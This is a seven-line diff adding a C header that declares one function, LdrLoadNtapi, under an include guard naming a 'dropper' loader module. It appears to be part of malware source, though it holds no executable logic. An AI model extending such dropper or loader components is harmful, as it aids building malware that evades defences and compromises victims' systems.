@@ -1,0 +1,7 @@
+#ifndef __INCLUDE_MODULES_DROPPER_LDR_H
+#define __INCLUDE_MODULES_DROPPER_LDR_H
+
+BOOL
+LdrLoadNtapi(VOID);
+
+#endif
